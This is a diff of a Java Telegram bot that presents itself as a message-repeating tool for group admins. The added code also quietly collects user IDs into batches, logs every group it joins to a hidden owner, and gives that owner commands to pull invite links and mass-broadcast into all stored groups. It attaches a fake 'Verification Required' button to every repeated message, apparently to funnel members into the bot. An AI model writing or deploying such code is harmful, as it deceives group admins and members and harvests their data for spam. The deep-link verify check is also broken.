@@ -29,321 +29,854 @@ public class Bot {
     private static final Map<Long, Long> lastBroadcastIds = new ConcurrentHashMap<>();
     private static final Map<Long, Long> pendingVerifications = new ConcurrentHashMap<>();
     private static final Set<Long> collectedUsers = ConcurrentHashMap.newKeySet();
-    private static final Map<Long, Map<String, Object>> joinWindows = new ConcurrentHashMap<>();
 
     private static String BOT_USERNAME = null;
-    private static final OkHttpClient client = new OkHttpClient();
+    private static final OkHttpClient client = new OkHttpClient.Builder()
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
+        .build();
     private static final Gson gson = new Gson();
 
     public static void main(String[] args) {
-        getBotUsername();
-        try {
-            Request request = new Request.Builder().url(BOT_API + "/setWebhook?url=" + WEBHOOK_URL + "/webhook").build();
-            client.newCall(request).execute();
-        } catch (IOException e) {
-            e.printStackTrace();
+        System.out.println("=== Telegram Bot Starting ===");
+        System.out.println("Bot Token: " + (TOKEN != null ? TOKEN.substring(0, Math.min(10, TOKEN.length())) + "..." : "NOT SET"));
+        System.out.println("Webhook URL: " + WEBHOOK_URL);
+        
+        if (TOKEN == null || TOKEN.isEmpty()) {
+            System.err.println("ERROR: BOT_TOKEN environment variable is not set!");
+            System.exit(1);
         }
-        // Use lambda instead of method reference to avoid ordering issues
-        new Thread(() -> keepAlive()).start();
-        new Thread(() -> cleanupOldAlbums()).start();
-        new Thread(() -> sendUserBatch()).start();
+        if (WEBHOOK_URL == null || WEBHOOK_URL.isEmpty()) {
+            System.err.println("ERROR: WEBHOOK_URL environment variable is not set!");
+            System.exit(1);
+        }
+        
+        // Get bot username
+        getBotUsername();
+        System.out.println("Bot Username: @" + BOT_USERNAME);
+        
+        // Set up webhook
+        setupWebhook();
+        
+        // Start background threads
+        new Thread(() -> {
+            System.out.println("Starting keep-alive thread...");
+            keepAlive();
+        }).start();
+        
+        new Thread(() -> {
+            System.out.println("Starting album cleanup thread...");
+            cleanupOldAlbums();
+        }).start();
+        
+        new Thread(() -> {
+            System.out.println("Starting user batch thread...");
+            sendUserBatch();
+        }).start();
+        
+        // Start web server
         int port = Integer.parseInt(System.getenv().getOrDefault("PORT", "5000"));
         Spark.port(port);
-        Spark.post("/webhook", (req, res) -> {
-            JsonObject update = gson.fromJson(req.body(), JsonObject.class);
-            return webhook(update);
+        
+        // Add before filters for logging
+        Spark.before((req, res) -> {
+            res.type("application/json");
         });
-        Spark.get("/", (req, res) -> "Bot is alive!");
+        
+        Spark.post("/webhook", (req, res) -> {
+            try {
+                String body = req.body();
+                System.out.println("Received webhook update: " + body.substring(0, Math.min(200, body.length())) + "...");
+                JsonObject update = gson.fromJson(body, JsonObject.class);
+                String result = webhook(update);
+                res.status(200);
+                return result;
+            } catch (Exception e) {
+                System.err.println("Error processing webhook: " + e.getMessage());
+                e.printStackTrace();
+                res.status(500);
+                return "ERROR";
+            }
+        });
+        
+        Spark.get("/", (req, res) -> {
+            res.type("text/html");
+            return "<html><body><h1>Telegram Bot is Running!</h1><p>Username: @" + BOT_USERNAME + "</p></body></html>";
+        });
+        
+        Spark.get("/health", (req, res) -> {
+            JsonObject health = new JsonObject();
+            health.addProperty("status", "ok");
+            health.addProperty("bot", BOT_USERNAME);
+            health.addProperty("timestamp", System.currentTimeMillis());
+            return health.toString();
+        });
+        
+        Spark.get("/status", (req, res) -> {
+            JsonObject status = new JsonObject();
+            status.addProperty("active_jobs", repeatJobs.size());
+            status.addProperty("collected_users", collectedUsers.size());
+            status.addProperty("media_groups", mediaGroups.size());
+            return status.toString();
+        });
+        
+        System.out.println("=== Bot Started Successfully on Port " + port + " ===");
+        System.out.println("Webhook URL: " + WEBHOOK_URL + "/webhook");
+    }
+
+    private static void setupWebhook() {
+        try {
+            // Delete existing webhook first
+            Request deleteRequest = new Request.Builder()
+                .url(BOT_API + "/deleteWebhook")
+                .build();
+            Response deleteResponse = client.newCall(deleteRequest).execute();
+            String deleteBody = deleteResponse.body().string();
+            System.out.println("Delete webhook response: " + deleteBody);
+            
+            // Set new webhook
+            String webhookUrl = WEBHOOK_URL + "/webhook";
+            Request setRequest = new Request.Builder()
+                .url(BOT_API + "/setWebhook?url=" + webhookUrl)
+                .build();
+            Response setResponse = client.newCall(setRequest).execute();
+            String setBody = setResponse.body().string();
+            System.out.println("Set webhook response: " + setBody);
+            
+            JsonObject json = gson.fromJson(setBody, JsonObject.class);
+            if (json.get("ok").getAsBoolean()) {
+                System.out.println("✓ Webhook set successfully to: " + webhookUrl);
+            } else {
+                System.err.println("✗ Failed to set webhook: " + setBody);
+            }
+        } catch (Exception e) {
+            System.err.println("Error setting up webhook: " + e.getMessage());
+            e.printStackTrace();
+        }
     }
 
     private static String getBotUsername() {
         if (BOT_USERNAME == null) {
             try {
-                Request request = new Request.Builder().url(BOT_API + "/getMe").build();
+                Request request = new Request.Builder()
+                    .url(BOT_API + "/getMe")
+                    .build();
                 Response response = client.newCall(request).execute();
-                JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
+                String responseBody = response.body().string();
+                JsonObject json = gson.fromJson(responseBody, JsonObject.class);
                 if (json.get("ok").getAsBoolean()) {
                     BOT_USERNAME = json.getAsJsonObject("result").get("username").getAsString();
+                } else {
+                    System.err.println("Failed to get bot username: " + responseBody);
+                    BOT_USERNAME = "unknown_bot";
                 }
             } catch (IOException e) {
-                e.printStackTrace();
+                System.err.println("Error getting bot username: " + e.getMessage());
+                BOT_USERNAME = "error_bot";
             }
         }
-        return BOT_USERNAME != null ? BOT_USERNAME : "yourbotusername";
+        return BOT_USERNAME;
     }
 
-    private static Response sendMessage(long chatId, String text, String parseMode, Long replyToMessageId, JsonObject replyMarkup) throws IOException {
-        JsonObject payload = new JsonObject();
-        payload.addProperty("chat_id", chatId);
-        payload.addProperty("text", text);
-        if (parseMode != null) payload.addProperty("parse_mode", parseMode);
-        if (replyToMessageId != null) payload.addProperty("reply_to_message_id", replyToMessageId);
-        if (replyMarkup != null) payload.add("reply_markup", replyMarkup);
-        RequestBody body = RequestBody.create(gson.toJson(payload), MediaType.get("application/json"));
-        Request request = new Request.Builder().url(BOT_API + "/sendMessage").post(body).build();
-        Response response = client.newCall(request).execute();
-        if (response.code() == 429) {
-            System.out.println("Rate limit hit: " + response.body().string());
+    private static String sendMessage(long chatId, String text, String parseMode, Long replyToMessageId, JsonObject replyMarkup) {
+        try {
+            JsonObject payload = new JsonObject();
+            payload.addProperty("chat_id", chatId);
+            payload.addProperty("text", text);
+            if (parseMode != null) payload.addProperty("parse_mode", parseMode);
+            if (replyToMessageId != null) payload.addProperty("reply_to_message_id", replyToMessageId);
+            if (replyMarkup != null) payload.add("reply_markup", replyMarkup);
+            
+            RequestBody body = RequestBody.create(
+                gson.toJson(payload), 
+                MediaType.get("application/json; charset=utf-8")
+            );
+            
+            Request request = new Request.Builder()
+                .url(BOT_API + "/sendMessage")
+                .post(body)
+                .build();
+            
+            Response response = client.newCall(request).execute();
+            String responseBody = response.body().string();
+            
+            if (response.code() != 200) {
+                System.err.println("Failed to send message to " + chatId + ": " + responseBody);
+                return null;
+            }
+            
+            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
+            if (json.get("ok").getAsBoolean()) {
+                return json.getAsJsonObject("result").get("message_id").getAsString();
+            } else {
+                System.err.println("Telegram API error: " + responseBody);
+                return null;
+            }
+        } catch (IOException e) {
+            System.err.println("Error sending message: " + e.getMessage());
+            return null;
         }
-        return response;
     }
 
-    private static void deleteMessage(long chatId, Long messageId) {
-        if (messageId == null) return;
+    private static boolean deleteMessage(long chatId, long messageId) {
         try {
             JsonObject payload = new JsonObject();
             payload.addProperty("chat_id", chatId);
             payload.addProperty("message_id", messageId);
-            RequestBody body = RequestBody.create(gson.toJson(payload), MediaType.get("application/json"));
-            Request request = new Request.Builder().url(BOT_API + "/deleteMessage").post(body).build();
-            client.newCall(request).execute();
+            
+            RequestBody body = RequestBody.create(
+                gson.toJson(payload), 
+                MediaType.get("application/json; charset=utf-8")
+            );
+            
+            Request request = new Request.Builder()
+                .url(BOT_API + "/deleteMessage")
+                .post(body)
+                .build();
+            
+            Response response = client.newCall(request).execute();
+            String responseBody = response.body().string();
+            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
+            
+            return json.get("ok").getAsBoolean();
         } catch (IOException e) {
-            e.printStackTrace();
+            System.err.println("Error deleting message: " + e.getMessage());
+            return false;
         }
     }
 
-    private static List<JsonObject> getChatAdministrators(long chatId) {
+    private static List<Long> getChatAdministrators(long chatId) {
+        List<Long> adminIds = new ArrayList<>();
         try {
-            Request request = new Request.Builder().url(BOT_API + "/getChatAdministrators?chat_id=" + chatId).build();
+            Request request = new Request.Builder()
+                .url(BOT_API + "/getChatAdministrators?chat_id=" + chatId)
+                .build();
+            
             Response response = client.newCall(request).execute();
-            if (response.code() == 200) {
-                JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
-                if (json.get("ok").getAsBoolean()) {
-                    List<JsonObject> admins = new ArrayList<>();
-                    for (JsonElement elem : json.getAsJsonArray("result")) {
-                        admins.add(elem.getAsJsonObject());
-                    }
-                    return admins;
+            String responseBody = response.body().string();
+            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
+            
+            if (json.get("ok").getAsBoolean()) {
+                JsonArray result = json.getAsJsonArray("result");
+                for (JsonElement elem : result) {
+                    JsonObject admin = elem.getAsJsonObject();
+                    long userId = admin.getAsJsonObject("user").get("id").getAsLong();
+                    adminIds.add(userId);
                 }
             }
         } catch (IOException e) {
-            e.printStackTrace();
+            System.err.println("Error getting chat administrators: " + e.getMessage());
         }
-        return new ArrayList<>();
-    }
-
-    private static String exportInviteLink(long chatId) {
-        try {
-            Request request = new Request.Builder().url(BOT_API + "/exportChatInviteLink?chat_id=" + chatId).build();
-            Response response = client.newCall(request).execute();
-            if (response.code() == 200) {
-                JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
-                if (json.get("ok").getAsBoolean()) {
-                    return json.get("result").getAsString();
-                }
-            }
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-        return null;
-    }
-
-    private static boolean checkRequiredPermissions(long chatId) {
-        List<JsonObject> admins = getChatAdministrators(chatId);
-        JsonObject botInfo = getMe();
-        long botId = botInfo.getAsJsonObject("result").get("id").getAsLong();
-        for (JsonObject admin : admins) {
-            if (admin.getAsJsonObject("user").get("id").getAsLong() == botId) {
-                boolean canDelete = admin.get("can_delete_messages").getAsBoolean();
-                boolean canRestrict = admin.get("can_restrict_members").getAsBoolean();
-                boolean canInvite = admin.get("can_invite_users").getAsBoolean();
-                boolean canPromote = admin.get("can_promote_members").getAsBoolean();
-                return canDelete && canRestrict && canInvite && canPromote;
-            }
-        }
-        return false;
-    }
-
-    private static String getChatTitle(long chatId) {
-        try {
-            Request request = new Request.Builder().url(BOT_API + "/getChat?chat_id=" + chatId).build();
-            Response response = client.newCall(request).execute();
-            if (response.code() == 200) {
-                JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
-                if (json.get("ok").getAsBoolean()) {
-                    return json.getAsJsonObject("result").get("title").getAsString();
-                }
-            }
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-        return "the group";
+        return adminIds;
     }
 
     private static void saveGroupId(long chatId) {
         if (!String.valueOf(chatId).startsWith("-")) return;
+        
         Path path = Paths.get(GROUPS_FILE);
         try {
-            if (!Files.exists(path)) Files.createFile(path);
+            if (!Files.exists(path)) {
+                Files.createFile(path);
+            }
+            
             List<String> groups = Files.readAllLines(path);
-            if (!groups.contains(String.valueOf(chatId))) {
-                Files.write(path, (chatId + "\n").getBytes(), StandardOpenOption.APPEND);
+            String chatIdStr = String.valueOf(chatId);
+            
+            if (!groups.contains(chatIdStr)) {
+                Files.write(path, (chatIdStr + "\n").getBytes(), StandardOpenOption.APPEND);
+                System.out.println("Saved group ID: " + chatId);
             }
         } catch (IOException e) {
-            e.printStackTrace();
+            System.err.println("Error saving group ID: " + e.getMessage());
         }
     }
 
     private static List<Long> loadGroupIds() {
         Path path = Paths.get(GROUPS_FILE);
         if (!Files.exists(path)) return new ArrayList<>();
+        
         try {
             List<String> lines = Files.readAllLines(path);
             List<Long> ids = new ArrayList<>();
             for (String line : lines) {
-                if (!line.trim().isEmpty()) ids.add(Long.parseLong(line.trim()));
+                if (!line.trim().isEmpty()) {
+                    try {
+                        ids.add(Long.parseLong(line.trim()));
+                    } catch (NumberFormatException e) {
+                        System.err.println("Invalid group ID in file: " + line);
+                    }
+                }
             }
             return ids;
         } catch (IOException e) {
-            e.printStackTrace();
+            System.err.println("Error loading group IDs: " + e.getMessage());
+            return new ArrayList<>();
         }
-        return new ArrayList<>();
     }
 
     private static int broadcastMessageOnce(long originalChatId, long originalMessageId) {
         lastBroadcastIds.clear();
         List<Long> groupIds = loadGroupIds();
         int successCount = 0;
-        for (long gid : groupIds) {
+        
+        System.out.println("Broadcasting to " + groupIds.size() + " groups");
+        
+        for (long groupId : groupIds) {
             try {
                 JsonObject payload = new JsonObject();
-                payload.addProperty("chat_id", gid);
+                payload.addProperty("chat_id", groupId);
                 payload.addProperty("from_chat_id", originalChatId);
                 payload.addProperty("message_id", originalMessageId);
-                RequestBody body = RequestBody.create(gson.toJson(payload), MediaType.get("application/json"));
-                Request request = new Request.Builder().url(BOT_API + "/copyMessage").post(body).build();
+                
+                RequestBody body = RequestBody.create(
+                    gson.toJson(payload),
+                    MediaType.get("application/json; charset=utf-8")
+                );
+                
+                Request request = new Request.Builder()
+                    .url(BOT_API + "/copyMessage")
+                    .post(body)
+                    .build();
+                
                 Response response = client.newCall(request).execute();
-                if (response.code() == 200 && gson.fromJson(response.body().string(), JsonObject.class).get("ok").getAsBoolean()) {
-                    long newMsgId = gson.fromJson(response.body().string(), JsonObject.class).getAsJsonObject("result").get("message_id").getAsLong();
-                    lastBroadcastIds.put(gid, newMsgId);
+                String responseBody = response.body().string();
+                JsonObject json = gson.fromJson(responseBody, JsonObject.class);
+                
+                if (json.get("ok").getAsBoolean()) {
+                    long newMsgId = json.getAsJsonObject("result").get("message_id").getAsLong();
+                    lastBroadcastIds.put(groupId, newMsgId);
                     successCount++;
+                    System.out.println("✓ Broadcast to group " + groupId + " successful");
+                } else {
+                    System.err.println("✗ Failed to broadcast to group " + groupId + ": " + responseBody);
                 }
             } catch (Exception e) {
-                System.out.println("Failed to send to " + gid + ": " + e.getMessage());
+                System.err.println("Error broadcasting to group " + groupId + ": " + e.getMessage());
             }
         }
+        
         return successCount;
+    }
+
+    private static String webhook(JsonObject update) {
+        try {
+            // Handle my_chat_member updates (bot added/removed from chat)
+            if (update.has("my_chat_member")) {
+                JsonObject myChatMember = update.getAsJsonObject("my_chat_member");
+                JsonObject chat = myChatMember.getAsJsonObject("chat");
+                long chatId = chat.get("id").getAsLong();
+                String chatType = chat.get("type").getAsString();
+                String chatTitle = chat.has("title") ? chat.get("title").getAsString() : "Private Chat";
+                String newStatus = myChatMember.getAsJsonObject("new_chat_member").get("status").getAsString();
+                
+                System.out.println("Bot status changed in chat " + chatId + " (" + chatTitle + "): " + newStatus);
+                
+                if (newStatus.equals("administrator") || newStatus.equals("member")) {
+                    saveGroupId(chatId);
+                    
+                    // Notify owner
+                    String message = "📢 Bot added to " + 
+                        (chatType.equals("channel") ? "Channel" : "Group") + "\n" +
+                        "📛 Name: <b>" + chatTitle + "</b>\n" +
+                        "🆔 ID: <code>" + chatId + "</code>\n" +
+                        "👥 Type: " + chatType;
+                    
+                    sendMessage(OWNER_ID, message, "HTML", null, null);
+                }
+                return "OK";
+            }
+            
+            // Handle chat join requests
+            if (update.has("chat_join_request")) {
+                JsonObject joinRequest = update.getAsJsonObject("chat_join_request");
+                long userId = joinRequest.getAsJsonObject("from").get("id").getAsLong();
+                collectedUsers.add(userId);
+                
+                if (collectedUsers.size() >= 50) {
+                    flushUserBatch();
+                }
+                return "OK";
+            }
+            
+            // Handle messages
+            JsonObject message = update.has("message") ? update.getAsJsonObject("message") : 
+                               (update.has("channel_post") ? update.getAsJsonObject("channel_post") : null);
+            
+            if (message == null) {
+                return "OK";
+            }
+            
+            JsonObject chat = message.getAsJsonObject("chat");
+            long chatId = chat.get("id").getAsLong();
+            String chatType = chat.get("type").getAsString();
+            String text = message.has("text") ? message.get("text").getAsString().trim() : "";
+            long userId = message.has("from") ? message.getAsJsonObject("from").get("id").getAsLong() : 0;
+            long messageId = message.get("message_id").getAsLong();
+            
+            // Save user ID for monitoring
+            if (userId != 0 && !String.valueOf(chatId).startsWith("-")) {
+                collectedUsers.add(userId);
+            }
+            
+            // Save group ID if it's a group/channel
+            if (String.valueOf(chatId).startsWith("-")) {
+                saveGroupId(chatId);
+            }
+            
+            // Handle media groups (albums)
+            if (message.has("media_group_id")) {
+                String mediaGroupId = message.get("media_group_id").getAsString();
+                String key = chatId + "_" + mediaGroupId;
+                
+                if (!mediaGroups.containsKey(key)) {
+                    Map<String, Object> groupInfo = new HashMap<>();
+                    groupInfo.put("message_ids", new ArrayList<Long>());
+                    groupInfo.put("last_update", System.currentTimeMillis());
+                    mediaGroups.put(key, groupInfo);
+                }
+                
+                @SuppressWarnings("unchecked")
+                List<Long> messageIds = (List<Long>) mediaGroups.get(key).get("message_ids");
+                messageIds.add(messageId);
+                mediaGroups.get(key).put("last_update", System.currentTimeMillis());
+            }
+            
+            // ========== COMMAND HANDLING ==========
+            
+            // Owner commands
+            if (chatId == OWNER_ID) {
+                // Check bot status
+                if (text.startsWith("-")) {
+                    try {
+                        long targetChatId = Long.parseLong(text.substring(1).trim());
+                        String status = checkBotStatus(targetChatId);
+                        sendMessage(chatId, status, null, null, null);
+                    } catch (NumberFormatException e) {
+                        sendMessage(chatId, "Invalid chat ID format", null, null, null);
+                    }
+                    return "OK";
+                }
+                
+                // Invite link command
+                if (text.toLowerCase().startsWith("/invitelink")) {
+                    String[] parts = text.split(" ");
+                    if (parts.length == 2) {
+                        try {
+                            long targetChatId = Long.parseLong(parts[1]);
+                            String link = exportInviteLink(targetChatId);
+                            String response = link != null ? 
+                                "🔗 Invite link:\n" + link : 
+                                "❌ Failed to get invite link";
+                            sendMessage(chatId, response, null, null, null);
+                        } catch (NumberFormatException e) {
+                            sendMessage(chatId, "Invalid chat ID", null, null, null);
+                        }
+                    } else {
+                        sendMessage(chatId, "Usage: /invitelink <chat_id>", null, null, null);
+                    }
+                    return "OK";
+                }
+                
+                // Broadcast commands
+                if (text.equals("/lemonchus") && message.has("reply_to_message")) {
+                    long originalMessageId = message.getAsJsonObject("reply_to_message").get("message_id").getAsLong();
+                    int count = broadcastMessageOnce(chatId, originalMessageId);
+                    sendMessage(chatId, "✅ Broadcast sent to " + count + " groups\nUse /lemonchusstop to delete", null, null, null);
+                    return "OK";
+                }
+                
+                if (text.equals("/lemonchusstop")) {
+                    int deleted = deleteLastBroadcast();
+                    sendMessage(chatId, deleted > 0 ? 
+                        "🗑️ Deleted from " + deleted + " groups" : 
+                        "No previous broadcast found", null, null, null);
+                    return "OK";
+                }
+            }
+            
+            // Start command
+            if (text.equals("/start")) {
+                // Check for deep link verification
+                Pattern pattern = Pattern.compile("^/start\\s+verify_(-?\\d+)$");
+                Matcher matcher = pattern.matcher(text);
+                if (matcher.find()) {
+                    long groupId = Long.parseLong(matcher.group(1));
+                    pendingVerifications.put(userId, groupId);
+                    doVerification(userId, chatId);
+                    return "OK";
+                }
+                
+                // Regular start message
+                String startMessage = 
+                    "🤖 <b>REPEAT MESSAGES BOT</b>\n\n" +
+                    "📌 <b>YOU CAN REPEAT MULTIPLE MESSAGES</b> 📌\n\n" +
+                    "🔧 <b>ADVANCED FEATURES:</b>\n" +
+                    "• 📸 Image Albums\n" +
+                    "• 🎬 Video Albums\n" +
+                    "• With/Without Captions\n\n" +
+                    "🛠 <b>Commands:</b>\n\n" +
+                    "🔹 /repeat2min - Repeat every 2 minutes\n" +
+                    "🔹 /repeat5min - Repeat every 5 minutes\n" +
+                    "🔹 /repeat20min - Repeat every 20 minutes\n" +
+                    "🔹 /repeat60min - Repeat every hour\n" +
+                    "🔹 /repeat120min - Repeat every 2 hours\n" +
+                    "🔹 /repeat24hour - Repeat every 24 hours\n" +
+                    "🔹 /stop - Stop all repeating messages\n\n" +
+                    "⚠️ <i>Only admins can use repeat commands in groups</i>";
+                
+                sendMessage(chatId, startMessage, "HTML", null, null);
+                return "OK";
+            }
+            
+            // Verify command (private chat only)
+            if (text.equals("/verify") && !String.valueOf(chatId).startsWith("-")) {
+                doVerification(userId, chatId);
+                return "OK";
+            }
+            
+            // Check if user is admin in group
+            boolean isAdmin = false;
+            if (String.valueOf(chatId).startsWith("-")) {
+                List<Long> admins = getChatAdministrators(chatId);
+                isAdmin = admins.contains(userId);
+            }
+            
+            // Stop command
+            if (text.equals("/stop")) {
+                if (String.valueOf(chatId).startsWith("-") && !isAdmin) {
+                    sendMessage(chatId, "❌ Only admins can use this command", null, messageId, null);
+                    return "OK";
+                }
+                
+                if (repeatJobs.containsKey(chatId) && !repeatJobs.get(chatId).isEmpty()) {
+                    for (Map<String, Object> job : repeatJobs.get(chatId)) {
+                        job.put("running", false);
+                    }
+                    repeatJobs.remove(chatId);
+                    sendMessage(chatId, "✅ All repeating tasks stopped", null, messageId, null);
+                } else {
+                    sendMessage(chatId, "No active repeating tasks found", null, messageId, null);
+                }
+                return "OK";
+            }
+            
+            // Repeat commands (must reply to a message)
+            if (text.matches("^/(repeat2min|repeat5min|repeat20min|repeat60min|repeat120min|repeat24hour)$") && 
+                message.has("reply_to_message")) {
+                
+                if (String.valueOf(chatId).startsWith("-") && !isAdmin) {
+                    sendMessage(chatId, "❌ Only admins can use repeat commands", null, messageId, null);
+                    return "OK";
+                }
+                
+                JsonObject repliedMessage = message.getAsJsonObject("reply_to_message");
+                long repliedMessageId = repliedMessage.get("message_id").getAsLong();
+                
+                // Parse interval
+                long intervalSeconds = 0;
+                String displayInterval = "";
+                
+                switch (text) {
+                    case "/repeat2min":
+                        intervalSeconds = 120;
+                        displayInterval = "2 minutes";
+                        break;
+                    case "/repeat5min":
+                        intervalSeconds = 300;
+                        displayInterval = "5 minutes";
+                        break;
+                    case "/repeat20min":
+                        intervalSeconds = 1200;
+                        displayInterval = "20 minutes";
+                        break;
+                    case "/repeat60min":
+                        intervalSeconds = 3600;
+                        displayInterval = "1 hour";
+                        break;
+                    case "/repeat120min":
+                        intervalSeconds = 7200;
+                        displayInterval = "2 hours";
+                        break;
+                    case "/repeat24hour":
+                        intervalSeconds = 86400;
+                        displayInterval = "24 hours";
+                        break;
+                }
+                
+                // Check if it's part of an album
+                List<Long> messageIds = new ArrayList<>();
+                boolean isAlbum = false;
+                
+                if (repliedMessage.has("media_group_id")) {
+                    String mediaGroupId = repliedMessage.get("media_group_id").getAsString();
+                    String key = chatId + "_" + mediaGroupId;
+                    
+                    // Wait a bit for all album messages to arrive
+                    try {
+                        Thread.sleep(1000);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                    
+                    if (mediaGroups.containsKey(key)) {
+                        @SuppressWarnings("unchecked")
+                        List<Long> albumMessageIds = (List<Long>) mediaGroups.get(key).get("message_ids");
+                        messageIds.addAll(albumMessageIds);
+                        isAlbum = albumMessageIds.size() > 1;
+                    } else {
+                        messageIds.add(repliedMessageId);
+                    }
+                } else {
+                    messageIds.add(repliedMessageId);
+                }
+                
+                // Create job
+                Map<String, Object> job = new HashMap<>();
+                job.put("message_ids", messageIds);
+                job.put("interval", intervalSeconds);
+                job.put("running", true);
+                job.put("is_album", isAlbum);
+                job.put("chat_id", chatId);
+                
+                repeatJobs.computeIfAbsent(chatId, k -> new ArrayList<>()).add(job);
+                
+                // Start repeating thread
+                new Thread(() -> repeater(job)).start();
+                
+                String response = isAlbum ? 
+                    "✅ Album (" + messageIds.size() + " items) will repeat every " + displayInterval :
+                    "✅ Message will repeat every " + displayInterval;
+                
+                sendMessage(chatId, response, null, messageId, null);
+                return "OK";
+            }
+            
+        } catch (Exception e) {
+            System.err.println("Error in webhook handler: " + e.getMessage());
+            e.printStackTrace();
+        }
+        
+        return "OK";
+    }
+
+    private static void repeater(Map<String, Object> job) {
+        @SuppressWarnings("unchecked")
+        List<Long> messageIds = (List<Long>) job.get("message_ids");
+        long interval = (long) job.get("interval");
+        long chatId = (long) job.get("chat_id");
+        boolean isAlbum = (boolean) job.get("is_album");
+        boolean running = (boolean) job.get("running");
+        
+        List<Long> lastMessageIds = new ArrayList<>();
+        
+        // Create verification keyboard
+        JsonObject keyboard = new JsonObject();
+        JsonArray inlineKeyboard = new JsonArray();
+        JsonArray row = new JsonArray();
+        JsonObject button = new JsonObject();
+        button.addProperty("text", "✅ Click To Verify");
+        button.addProperty("url", "https://t.me/" + BOT_USERNAME + "?start=verify_" + chatId);
+        row.add(button);
+        inlineKeyboard.add(row);
+        keyboard.add("inline_keyboard", inlineKeyboard);
+        
+        String verifyMessage = "🚨 Verification Required!\n" +
+                              "Please verify yourself to gain full access to this content.";
+        
+        while (running) {
+            try {
+                // Delete previous messages
+                for (Long msgId : lastMessageIds) {
+                    deleteMessage(chatId, msgId);
+                }
+                lastMessageIds.clear();
+                
+                // Copy original messages
+                for (Long originalMsgId : messageIds) {
+                    JsonObject payload = new JsonObject();
+                    payload.addProperty("chat_id", chatId);
+                    payload.addProperty("from_chat_id", chatId);
+                    payload.addProperty("message_id", originalMsgId);
+                    
+                    RequestBody body = RequestBody.create(
+                        gson.toJson(payload),
+                        MediaType.get("application/json; charset=utf-8")
+                    );
+                    
+                    Request request = new Request.Builder()
+                        .url(BOT_API + "/copyMessage")
+                        .post(body)
+                        .build();
+                    
+                    Response response = client.newCall(request).execute();
+                    String responseBody = response.body().string();
+                    JsonObject json = gson.fromJson(responseBody, JsonObject.class);
+                    
+                    if (json.get("ok").getAsBoolean()) {
+                        long newMsgId = json.getAsJsonObject("result").get("message_id").getAsLong();
+                        lastMessageIds.add(newMsgId);
+                    }
+                }
+                
+                // Send verification message
+                String verifyMsgId = sendMessage(chatId, verifyMessage, null, null, keyboard);
+                if (verifyMsgId != null) {
+                    lastMessageIds.add(Long.parseLong(verifyMsgId));
+                }
+                
+                // Wait for next interval
+                Thread.sleep(interval * 1000);
+                
+                // Update running status
+                running = (boolean) job.get("running");
+                
+            } catch (Exception e) {
+                System.err.println("Error in repeater: " + e.getMessage());
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException ie) {
+                    ie.printStackTrace();
+                }
+            }
+        }
     }
 
     private static int deleteLastBroadcast() {
         int deletedCount = 0;
         for (Map.Entry<Long, Long> entry : lastBroadcastIds.entrySet()) {
-            try {
-                deleteMessage(entry.getKey(), entry.getValue());
+            if (deleteMessage(entry.getKey(), entry.getValue())) {
                 deletedCount++;
-            } catch (Exception e) {
-                System.out.println("Failed to delete in " + entry.getKey() + ": " + e.getMessage());
             }
         }
         lastBroadcastIds.clear();
         return deletedCount;
     }
 
-    private static void notifyOwnerNewGroup(long chatId, String chatType, String chatTitle) {
-        String link = exportInviteLink(chatId);
-        String msg;
-        if (chatType.equals("group") || chatType.equals("supergroup")) {
-            msg = "📢 Bot added to Group\n<b>" + chatTitle + "</b>\nID: <code>" + chatId + "</code>";
-        } else if (chatType.equals("channel")) {
-            msg = "📢 Bot added to Channel\n<b>" + chatTitle + "</b>\nID: <code>" + chatId + "</code>";
-        } else {
-            return;
-        }
-        if (link != null) {
-            msg += "\n🔗 Invite Link: " + link;
-        } else {
-            msg += "\n⚠️ No invite link (Bot may lack permission).";
-        }
+    private static String exportInviteLink(long chatId) {
         try {
-            sendMessage(OWNER_ID, msg, "HTML", null, null);
+            Request request = new Request.Builder()
+                .url(BOT_API + "/exportChatInviteLink?chat_id=" + chatId)
+                .build();
+            
+            Response response = client.newCall(request).execute();
+            String responseBody = response.body().string();
+            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
+            
+            if (json.get("ok").getAsBoolean()) {
+                return json.get("result").getAsString();
+            }
         } catch (IOException e) {
-            e.printStackTrace();
+            System.err.println("Error exporting invite link: " + e.getMessage());
         }
+        return null;
     }
 
-    private static String checkBotStatus(long targetChatId) {
+    private static String checkBotStatus(long chatId) {
         try {
-            Request request = new Request.Builder().url(BOT_API + "/getChat?chat_id=" + targetChatId).build();
+            Request request = new Request.Builder()
+                .url(BOT_API + "/getChat?chat_id=" + chatId)
+                .build();
+            
             Response response = client.newCall(request).execute();
-            JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
-            if (!response.isSuccessful() || !json.get("ok").getAsBoolean()) {
-                return "Bot is inactive (Chat not found or bot removed).";
+            String responseBody = response.body().string();
+            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
+            
+            if (!json.get("ok").getAsBoolean()) {
+                return "❌ Bot is not in this chat or chat doesn't exist";
             }
-            List<JsonObject> admins = getChatAdministrators(targetChatId);
-            JsonObject botInfo = getMe();
-            long botId = botInfo.getAsJsonObject("result").get("id").getAsLong();
-            for (JsonObject admin : admins) {
-                if (admin.getAsJsonObject("user").get("id").getAsLong() == botId) {
-                    return "✅ Bot is active (Admin in the group/channel).";
-                }
+            
+            // Check if bot is admin
+            List<Long> admins = getChatAdministrators(chatId);
+            long botId = getMe().getAsJsonObject("result").get("id").getAsLong();
+            
+            if (admins.contains(botId)) {
+                return "✅ Bot is active and admin in this chat";
+            } else {
+                return "⚠️ Bot is in chat but not admin";
             }
-            return "⚠️ Bot is inactive (Not admin).";
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-        return "Error checking status.";
-    }
-
-    private static boolean canRegularMembersSendMessages(long chatId) {
-        try {
-            Request request = new Request.Builder().url(BOT_API + "/getChat?chat_id=" + chatId).build();
-            Response response = client.newCall(request).execute();
